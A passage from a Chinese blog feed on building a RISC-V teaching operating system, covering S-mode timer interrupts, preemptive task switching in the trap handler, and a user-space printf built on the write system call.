<td align="center">1</td>
<td align="center">11</td>
<td align="center">Machine external interrupt（M模式下外部中断）</td>
</tr>
</tbody></table>
<p>可以看到这三种中断每一个都有 <code>M/S 特权级</code>两个版本。中断的特权级可以决定该中断是否会被屏蔽，以及需要 <code>Trap</code> 到 <code>CPU</code> 的哪个特权级进行处理。我们的目标是在<code>S</code>态使用时钟中断，这涉及到两个个在<code>S</code>态控制中断的寄存器<code>sstatus</code>,<code>sie</code></p>
<blockquote>
<p><code>sstatus</code>的<code>bit[2]</code>用来使能<code>S</code>态模式下的所有中断</p>
</blockquote>
<p><img src="/2024/06/18/riscv-11-%E5%88%86%E6%97%B6%E5%A4%9A%E4%BB%BB%E5%8A%A1%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E8%B0%83%E5%BA%A6%E7%AD%96%E7%95%A5%E5%AE%9E%E7%8E%B0/image-20240619151405654.png" alt="image-20240619151405654"></p>
<blockquote>
<p><code>sie</code>的<code>bit[5]</code>用来专门使能<code>S</code>态的时钟中断</p>
<ul>
<li>当<code>STIE</code>的<code>bit[5]</code>用来专门使能<code>S</code>态的时钟中断</li>
<li>它的三个字段 <code>ssie/stie/seie</code> 分别控制 S 特权级的软件中断、时钟中断和外部中断的中断使能</li>
</ul>
</blockquote>
<p><img src="/2024/06/18/riscv-11-%E5%88%86%E6%97%B6%E5%A4%9A%E4%BB%BB%E5%8A%A1%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E8%B0%83%E5%BA%A6%E7%AD%96%E7%95%A5%E5%AE%9E%E7%8E%B0/image-20240619151533223.png" alt="image-20240619151533223"></p>
<p>比如对于 S 态时钟中断来说，如果 CPU 不高于 S 特权级，需要 <code>sstatus.sie</code> 和 <code>sie.stie</code> 均为 1 该中断才不会被屏蔽；<strong>如果 CPU 当前特权级高于 S 特权级，则该中断一定会被屏蔽。</strong> —- <strong>例如当前CPU特权级为M模式</strong></p>
<p><strong>计时器：</strong></p>
<ul>
<li>RISC-V 64 架构上，该计数器保存在一个 64 位的 CSR <code>mtime</code> 中，我们无需担心它的溢出问题，在内核运行全程可以认为它是一直递增的。这个计数器一般我们叫做<code>RTC</code>。</li>
<li>另外一个 64 位的 CSR <code>mtimecmp</code> 的作用是：<strong>一旦计数器 <code>mtime</code> 的值超过了 <code>mtimecmp</code>，就会触发一次时钟中断。</strong></li>
</ul>
<blockquote>
<p>OS&#x2F;timer.c</p>
<p>在<code>timer_init()</code>函数中，分别将<code>sstatus.sie</code> 置 1 和<code>sie.stie</code> ，操作<code>sie</code>寄存器的代码放在<code>riscv.h</code>中</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;os.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CLOCK_FREQ 10000000 </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TICKS_PER_SEC 500</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 设置下次时钟中断的cnt值 */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_next_trigger</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    sbi_set_timer(r_mtime() + CLOCK_FREQ / TICKS_PER_SEC); <span class="comment">// 计算下一次中断的时间（当前时间 + 每秒的时钟频率除以每秒的时钟滴答数）</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 开启S模式下的时钟中断 */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">timer_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">reg_t</span> sstatus =r_sstatus();</span><br><span class="line">   sstatus |= (<span class="number">1L</span> &lt;&lt; <span class="number">1</span>) ; <span class="comment">// 设置sie 为1</span></span><br><span class="line">   w_sstatus(sstatus);</span><br><span class="line">   <span class="type">reg_t</span> sie = r_sie();</span><br><span class="line">   sie |= SIE_STIE;    <span class="comment">// 设置stie为1</span></span><br><span class="line">   w_sie(sie);</span><br><span class="line">   set_next_trigger();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 以us为单位返回时间 */</span></span><br><span class="line"><span class="comment">/* 以us为单位返回时间 */</span></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">get_time_us</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">reg_t</span> time =  r_mtime() / (CLOCK_FREQ / TICKS_PER_SEC); <span class="comment">// 除以每秒的时钟频率除以每秒的时钟滴答数，以微秒为单位返回当前时间。</span></span><br><span class="line">    <span class="keyword">return</span> time;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>OS&#x2F;riscv.h</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Supervisor Interrupt Enable*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIE_SEIE (1L &lt;&lt; 9) <span class="comment">// external</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIE_STIE (1L &lt;&lt; 5) <span class="comment">// timer</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIE_SSIE (1L &lt;&lt; 1) <span class="comment">// software</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">reg_t</span> <span class="title function_">r_sie</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">reg_t</span> x;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;csrr %0, sie&quot;</span> : <span class="string">&quot;=r&quot;</span> (x) )</span>;</span><br><span class="line">  <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">w_sie</span><span class="params">(<span class="type">reg_t</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;csrw sie, %0&quot;</span> : : <span class="string">&quot;r&quot;</span> (x))</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 获取mtime*/</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">reg_t</span> <span class="title function_">r_mtime</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">reg_t</span> x;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;rdtime %0&quot;</span> : <span class="string">&quot;=r&quot;</span>(x))</span>;</span><br><span class="line">  <span class="comment">// asm volatime(&quot;csrr %0, 0x0C01&quot; : &quot;=r&quot; (x) )</span></span><br><span class="line">  <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>获取mtime的值：</strong></p>
<ul>
<li>为了设置时钟中断的频率我们需要先读到<code>mtime</code>的值，然后设置<code>mtimecmp</code> ，这两个寄存器都是<code>M</code>模式下的，在<code>S</code>模式下不能直接访问</li>
<li>第一种是使用<code>rdtime</code>这个伪指令，这里是在哪里找的呢，在<code>opensbi</code>的源码中，在<code>lib/sbi/sbi_timer.c</code></li>
<li>第二种方式是<code>asm volatime(&quot;csrr %0, 0x0C01&quot; : &quot;=r&quot; (x) )</code>来读取，<code>mtime</code>这个寄存器通过<code>MMIO</code>映射到了一个确定的地址，这个地址和平台有关，在<code>opensbi</code>源码的<code>sbi_emulate_csr.c</code>中，<code>opensbi</code>将<code>mtime</code>的值映射到了<code>0xc01</code>的地方，这是<code>opensbi</code>做了二次映射，用于S态的程序来读取，实际<code>mtime</code>的映射地址应该由<code>qemu</code>来做的</li>
</ul>
<blockquote>
<p>OS&#x2F;sbi.c</p>
<p><code>mtimecmp</code>的值可以通过<code>opensbi</code>提供的接口来设置</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * sbi_set_timer() - Program the timer for next timer event.</span></span><br><span class="line"><span class="comment"> * @stime_value: The value after which next timer event should fire.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Return: None</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">sbi_set_timer</span><span class="params">(<span class="type">uint64_t</span> stime_value)</span></span><br><span class="line">&#123;</span><br><span class="line">	sbi_ecall(SBI_EXT_TIME, SBI_FID_SET_TIMER, stime_value,</span><br><span class="line">		  <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>OS&#x2F;sbi.h</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">sbi_ext_time_fid</span> &#123;</span></span><br><span class="line">	SBI_EXT_TIME_SET_TIMER = <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SBI_FID_SET_TIMER		SBI_EXT_TIME_SET_TIMER</span></span><br></pre></td></tr></table></figure>



<ul>
<li>在<code>qemu</code>中<code>rtc</code>的频率为<code>10mhz</code>，即<code>10^7</code></li>
<li>在上面的代码中，我将1s分成了1000个时间片，即每隔1us触发一次时钟中断，因此每次触发时钟中断设置的<code>mtimecmp</code>值为：<code>r_mtime() + CLOCK_FREQ / TICKS_PER_SEC</code></li>
</ul>
<h1 id="2-实现"><a href="#2-实现" class="headerlink" title="2.实现"></a>2.实现</h1><blockquote>
<p>OS&#x2F;trap.c</p>
<p>修改：只需要在时钟中断到来时，设置下一次时钟中断的<code>mtimecmp</code>的值，并切换一次任务</p>
<ul>
<li><code>scause</code>最高位为<code>1</code>时代表为中断则进入中断的判断分支，否则进入异常的处理分支。</li>
</ul>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">trap_Context* <span class="title function_">trap_handler</span><span class="params">(trap_Context* cx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">reg_t</span> scause = r_scause();</span><br><span class="line"></span><br><span class="line">	<span class="type">reg_t</span> cause_code = scause &amp; <span class="number">0xfff</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 1 &lt;&lt; 63 = 0x8000000000000000</span></span><br><span class="line">	<span class="keyword">if</span> (scause &amp; <span class="number">0x8000000000000000</span>)&#123;</span><br><span class="line">		<span class="comment">// 中断模式</span></span><br><span class="line">		<span class="keyword">switch</span> (cause_code)</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">/* rtc 中断*/</span></span><br><span class="line">		<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">			set_next_trigger();</span><br><span class="line">			schedule();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			printk(<span class="string">&quot;undfined interrrupt scause:%x\n&quot;</span>, scause);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// 异常模式</span></span><br><span class="line">		<span class="keyword">switch</span> (cause_code)</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">/* U模式下的syscall */</span></span><br><span class="line">		<span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">			cx-&gt;a0 = __SYSCALL(cx-&gt;a7,cx-&gt;a0,cx-&gt;a1,cx-&gt;a2);</span><br><span class="line">			cx-&gt;sepc += <span class="number">8</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			printk(<span class="string">&quot;undfined exception scause:%x\n&quot;</span>,scause);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> cx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="3-测试"><a href="#3-测试" class="headerlink" title="3.测试"></a>3.测试</h1><blockquote>
<p>OS&#x2F;app.c</p>
<ul>
<li>注释掉<code>yield</code> 然后让任务自主根据定时器切换</li>
</ul>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">uint64_t</span> <span class="title function_">sys_gettime</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_gettimeofday,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">task1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *message = <span class="string">&quot;task1 is running!\n&quot;</span>;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(message);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sys_wirte(<span class="number">1</span>,message, len);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">task2</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *message = <span class="string">&quot;task2 is running!\n&quot;</span>;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(message);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sys_wirte(<span class="number">1</span>,message, len);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">task3</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *message = <span class="string">&quot;task3 is running!\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(message);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sys_wirte(<span class="number">1</span>,message, len);</span><br><span class="line">        <span class="comment">//task_delay(10000);</span></span><br><span class="line">        <span class="comment">//sys_yield();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">task_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	task_create(task1);</span><br><span class="line">	task_create(task2);</span><br><span class="line">    task_create(task3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>OS&#x2F;main.c</p>
<p>添加时钟初始化</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;os.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">os_main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;hello!!!\n&quot;</span>);</span><br><span class="line">    trap_init();</span><br><span class="line">    task_init();</span><br><span class="line">    timer_init(); <span class="comment">// 时钟初始化</span></span><br><span class="line">    run_first_task();</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>总结：</strong></p>
<p><strong>其余的修改见commit</strong>，主要就是添加了<code>timer.c</code>文件 已经修改 中断与异常分发，区分中断与异常 为1则为中断，以及配置相应的时钟，获取RTL时间。</p>
<ul>
<li>RISC-V 64 架构上，该计数器保存在一个 64 位的 CSR <code>mtime</code> 中，我们无需担心它的溢出问题，在内核运行全程可以认为它是一直递增的。这个计数器一般我们叫做<code>RTC</code>。</li>
<li>另外一个 64 位的 CSR <code>mtimecmp</code> 的作用是：<strong>一旦计数器 <code>mtime</code> 的值超过了 <code>mtimecmp</code>，就会触发一次时钟中断。</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 关键代码*/</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">			set_next_trigger();</span><br><span class="line">			schedule();</span><br><span class="line">			<span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>





<blockquote>
<p>sudo .&#x2F;build.sh</p>
<p>sudo .&#x2F;run.sh</p>
</blockquote>
<p><img src="/2024/06/18/riscv-11-%E5%88%86%E6%97%B6%E5%A4%9A%E4%BB%BB%E5%8A%A1%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E8%B0%83%E5%BA%A6%E7%AD%96%E7%95%A5%E5%AE%9E%E7%8E%B0/image-20240619170728006.png" alt="image-20240619170728006"></p>
]]></content>
      <categories>
        <category>riscv</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
        <tag>riscv，qemu</tag>
      </tags>
  </entry>
  <entry>
    <title>riscv-12-printf实现</title>
    <url>/2024/06/19/riscv-12-printf%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="1-实现printf"><a href="#1-实现printf" class="headerlink" title="1.实现printf"></a>1.实现printf</h1><p>之前实现了内核态的<code>printk</code>，在<code>U</code>模式下都是通过<code>sys_write</code>的系统调用来向串口输出数据，因此需要实现一个用户态的<code>printf</code>函数</p>
<blockquote>
<p>OS&#x2F;lib&#x2F;printf.c</p>
<p>实现跟之前的<code>printk</code>类似，但是系统调用将<code>uart_put</code>需要修改为 <code>sys_write()</code></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sifanos/os.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sifanos/syscall.h&gt;</span></span></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> out_buf[<span class="number">1000</span>]; <span class="comment">// buffer for vprintf()</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">vprintf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* s, va_list vl)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> res = _vsnprintf(<span class="literal">NULL</span>, <span class="number">-1</span>, s, vl);</span><br><span class="line">	_vsnprintf(out_buf, res + <span class="number">1</span>, s, vl);</span><br><span class="line">	sys_write(<span class="built_in">stdout</span>,out_buf,res + <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* s, ...)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">	va_list vl;</span><br><span class="line">	va_start(vl, s);</span><br><span class="line">	res = <span class="built_in">vprintf</span>(s, vl);</span><br><span class="line">	va_end(vl);</span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>OS&#x2F;lib&#x2F;vsprintf.c</p>
<p>这里放<code>printk</code>和 <code>printf</code>公用的函数，对字符串进行解析和处理</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sifanos/stdio.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _vsnprintf(<span class="type">char</span> * out, <span class="type">size_t</span> n, <span class="type">const</span> <span class="type">char</span>* s, va_list vl)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> format = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> longarg = <span class="number">0</span>;</span><br><span class="line">	<span class="type">size_t</span> pos = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (; *s; s++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (format) &#123;</span><br><span class="line">			<span class="keyword">switch</span>(*s) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;l&#x27;</span>: &#123;</span><br><span class="line">				longarg = <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>: &#123;</span><br><span class="line">				longarg = <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">if</span> (out &amp;&amp; pos &lt; n) &#123;</span><br><span class="line">					out[pos] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				pos++;</span><br><span class="line">				<span class="keyword">if</span> (out &amp;&amp; pos &lt; n) &#123;</span><br><span class="line">					out[pos] = <span class="string">&#x27;x&#x27;</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				pos++;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>: &#123;</span><br><span class="line">				<span class="type">long</span> num = longarg ? va_arg(vl, <span class="type">long</span>) : va_arg(vl, <span class="type">int</span>);</span><br><span class="line">				<span class="type">int</span> hexdigits = <span class="number">2</span>*(longarg ? <span class="keyword">sizeof</span>(<span class="type">long</span>) : <span class="keyword">sizeof</span>(<span class="type">int</span>))<span class="number">-1</span>;</span><br><span class="line">				<span class="keyword">for</span>(<span class="type">int</span> i = hexdigits; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">					<span class="type">int</span> d = (num &gt;&gt; (<span class="number">4</span>*i)) &amp; <span class="number">0xF</span>;</span><br><span class="line">					<span class="keyword">if</span> (out &amp;&amp; pos &lt; n) &#123;</span><br><span class="line">						out[pos] = (d &lt; <span class="number">10</span> ? <span class="string">&#x27;0&#x27;</span>+d : <span class="string">&#x27;a&#x27;</span>+d<span class="number">-10</span>);</span><br><span class="line">					&#125;</span><br><span class="line">					pos++;</span><br><span class="line">				&#125;</span><br><span class="line">				longarg = <span class="number">0</span>;</span><br><span class="line">				format = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>: &#123;</span><br><span class="line">				<span class="type">long</span> num = longarg ? va_arg(vl, <span class="type">long</span>) : va_arg(vl, <span class="type">int</span>);</span><br><span class="line">				<span class="keyword">if</span> (num &lt; <span class="number">0</span>) &#123;</span><br><span class="line">					num = -num;</span><br><span class="line">					<span class="keyword">if</span> (out &amp;&amp; pos &lt; n) &#123;</span><br><span class="line">						out[pos] = <span class="string">&#x27;-&#x27;</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					pos++;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="type">long</span> digits = <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">for</span> (<span class="type">long</span> nn = num; nn /= <span class="number">10</span>; digits++);</span><br><span class="line">				<span class="keyword">for</span> (<span class="type">int</span> i = digits<span class="number">-1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">					<span class="keyword">if</span> (out &amp;&amp; pos + i &lt; n) &#123;</span><br><span class="line">						out[pos + i] = <span class="string">&#x27;0&#x27;</span> + (num % <span class="number">10</span>);</span><br><span class="line">					&#125;</span><br><span class="line">					num /= <span class="number">10</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				pos += digits;</span><br><span class="line">				longarg = <span class="number">0</span>;</span><br><span class="line">				format = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>: &#123;</span><br><span class="line">				<span class="type">const</span> <span class="type">char</span>* s2 = va_arg(vl, <span class="type">const</span> <span class="type">char</span>*);</span><br><span class="line">				<span class="keyword">while</span> (*s2) &#123;</span><br><span class="line">					<span class="keyword">if</span> (out &amp;&amp; pos &lt; n) &#123;</span><br><span class="line">						out[pos] = *s2;</span><br><span class="line">					&#125;</span><br><span class="line">					pos++;</span><br><span class="line">					s2++;</span><br><span class="line">				&#125;</span><br><span class="line">				longarg = <span class="number">0</span>;</span><br><span class="line">				format = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;c&#x27;</span>: &#123;</span><br><span class="line">				<span class="keyword">if</span> (out &amp;&amp; pos &lt; n) &#123;</span><br><span class="line">					out[pos] = (<span class="type">char</span>)va_arg(vl,<span class="type">int</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				pos++;</span><br><span class="line">				longarg = <span class="number">0</span>;</span><br><span class="line">				format = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (*s == <span class="string">&#x27;%&#x27;</span>) &#123;</span><br><span class="line">			format = <span class="number">1</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (out &amp;&amp; pos &lt; n) &#123;</span><br><span class="line">				out[pos] = *s;</span><br><span class="line">			&#125;</span><br><span class="line">			pos++;</span><br><span class="line">		&#125;</span><br><span class="line">    	&#125;</span><br><span class="line">	<span class="keyword">if</span> (out &amp;&amp; pos &lt; n) &#123;</span><br><span class="line">		out[pos] = <span class="number">0</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (out &amp;&amp; n) &#123;</span><br><span class="line">		out[n<span class="number">-1</span>] = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> pos;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<blockquote>
<p>OS&#x2F;include&#x2F;stdio.h</p>
<p>声明了一些函数以及定义了文件描述符</p>
<p>在c语言中枚举若无明确定义 则从0开始分配</p>
<p>所以<code>std = 0</code>， <code>stdout = 1</code>， <code>stderr = 2</code></p>
<p><code>stdout</code> 是标准输出流（standard output stream）的缩写，通常用于打印程序的输出信息。标准输出流是一个文件描述符，在大多数系统中，其值为 1。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SOS_STDIO_H__</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SOS_STDIO_H__</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sifanos/os.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _vsnprintf(<span class="type">char</span> * out, <span class="type">size_t</span> n, <span class="type">const</span> <span class="type">char</span>* s, va_list vl);</span><br><span class="line"><span class="type">void</span> <span class="title function_">panic</span><span class="params">(<span class="type">char</span> *s)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">printk</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* s, ...)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* s, ...)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 文件描述符 */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> <span class="title">std_fd_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="built_in">stdin</span>,  </span><br><span class="line">    <span class="built_in">stdout</span>,</span><br><span class="line">    <span class="built_in">stderr</span>,</span><br><span class="line">&#125; <span class="type">std_fd_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>



<blockquote>
<p>OS&#x2F;include&#x2F;syscall.h</p>
<p>增加头文件 对函数进行声明</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SOS_SYSCALL_H__</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SOS_SYSCALL_H__</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* syscall */</span></span><br><span class="line"><span class="type">uint64_t</span> __SYSCALL(<span class="type">size_t</span> syscall_id, <span class="type">reg_t</span> arg1, <span class="type">reg_t</span> arg2, <span class="type">reg_t</span> arg3);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_write 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_yield 124</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_exit 93</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_gettimeofday 169</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">sys_write</span><span class="params">(<span class="type">size_t</span> fd, <span class="type">const</span> <span class="type">char</span>* buf, <span class="type">size_t</span> len)</span>;</span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">sys_yield</span><span class="params">()</span>;</span><br><span class="line"><span 